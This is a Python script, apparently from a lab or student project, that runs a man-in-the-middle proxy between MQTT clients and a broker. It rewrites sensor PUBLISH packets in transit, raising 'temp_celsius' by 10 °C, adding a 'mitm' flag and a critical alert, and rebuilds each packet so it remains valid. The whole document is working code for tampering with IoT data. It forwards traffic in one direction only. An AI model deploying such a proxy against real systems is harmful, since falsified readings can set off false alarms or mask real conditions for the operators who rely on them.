#!/usr/bin/env python3
"""
Script MITM — SMART-FISHING
Intercepte et modifie les messages MQTT en temps réel
"""

import socket
import threading
import json
import re

# Configuration
BROKER = "localhost"
BROKER_PORT = 1883
PROXY_PORT = 1884


def decode_remaining_length(data, start_idx=1):
    """Décode le champ Remaining Length MQTT (encodage à longueur variable)."""
    multiplier = 1
    value = 0
    idx = start_idx
    while True:
        byte = data[idx]
        value += (byte & 0x7F) * multiplier
        idx += 1
        if (byte & 0x80) == 0:
            break
        multiplier *= 128
    return value, idx  # valeur décodée, index où débute le contenu variable


def encode_remaining_length(length):
    """Encode un entier en Remaining Length MQTT (1 à 4 octets)."""
    encoded = bytearray()
    while True:
        byte = length % 128
        length //= 128
        if length > 0:
            byte |= 0x80
        encoded.append(byte)
        if length == 0:
            break
    return bytes(encoded)


def modifier_temperature(data):
    """
    Si le paquet est un PUBLISH contenant temp_celsius, modifie la valeur
    et reconstruit le paquet MQTT avec un Remaining Length correct.
    Sinon, retourne data inchangé.
    """
    if len(data) < 2:
        return data

    packet_type = data[0] & 0xF0
    if packet_type != 0x30:  # 0x30 = PUBLISH
        return data

    if b"temp_celsius" not in data:
        return data

    try:
        remaining_length, var_header_start = decode_remaining_length(data, 1)
        fixed_header_len = var_header_start
        variable_and_payload = data[var_header_start:var_header_start + remaining_length]

        # Variable header du PUBLISH : topic_length(2) + topic [+ packet_id(2) si QoS>0]
        topic_len = int.from_bytes(variable_and_payload[0:2], 'big')
        topic = variable_and_payload[2:2 + topic_len]

        qos = (data[0] & 0x06) >> 1
        offset = 2 + topic_len
        packet_id = b""
        if qos > 0:
            packet_id = variable_and_payload[offset:offset + 2]
            offset += 2

        payload = variable_and_payload[offset:]
        payload_str = payload.decode('utf-8', errors='ignore')

        json_match = re.search(r'\{[^{}]*\}', payload_str)
        if not json_match:
            return data

        json_str = json_match.group()
        json_data = json.loads(json_str)

        if 'temp_celsius' not in json_data:
            return data

        temp_originale = json_data['temp_celsius']
        json_data['temp_celsius'] = round(temp_originale + 10.0, 2)
        json_data['mitm'] = True

        if json_data['temp_celsius'] > 30:
            json_data['alerte'] = "CRITIQUE"
            print(f"[MITM] {temp_originale}°C → {json_data['temp_celsius']}°C (ALERTE CRITIQUE)")
        else:
            print(f"[MITM] {temp_originale}°C → {json_data['temp_celsius']}°C")

        new_json_str = json.dumps(json_data)
        new_payload_str = payload_str.replace(json_str, new_json_str, 1)
        new_payload = new_payload_str.encode('utf-8')

        # Reconstruction du variable header + nouveau payload
        new_variable_and_payload = (
            topic_len.to_bytes(2, 'big') + topic + packet_id + new_payload
        )

        # Réencodage du Remaining Length avec la nouvelle taille
        new_remaining_length = encode_remaining_length(len(new_variable_and_payload))
        new_packet = data[0:1] + new_remaining_length + new_variable_and_payload

        return new_packet

    except Exception as e:
        print(f"[MITM] Erreur : {e}")
        return data


def handle_client(client_sock):
    broker_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    broker_sock.connect((BROKER, BROKER_PORT))
    print(f"[+] MITM actif : {client_sock.getpeername()} → Broker")

    while True:
        try:
            data = client_sock.recv(4096)
            if not data:
                break

            data = modifier_temperature(data)
            broker_sock.send(data)
        except Exception:
            break

    client_sock.close()
    broker_sock.close()
    print("[+] MITM terminé")


def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', PROXY_PORT))
    server.listen(5)

    print(f"[+] Proxy MITM en écoute sur le port {PROXY_PORT}")
    print("[+] La température sera augmentée de 10°C\n")

    try:
        while True:
            client_sock, addr = server.accept()
            print(f"[+] Connexion de {addr}")
            thread = threading.Thread(target=handle_client, args=(client_sock,))
            thread.daemon = True
            thread.start()
    except KeyboardInterrupt:
        print("\n[+] Arrêt du proxy MITM")
        server.close()


if __name__ == "__main__":
    main()
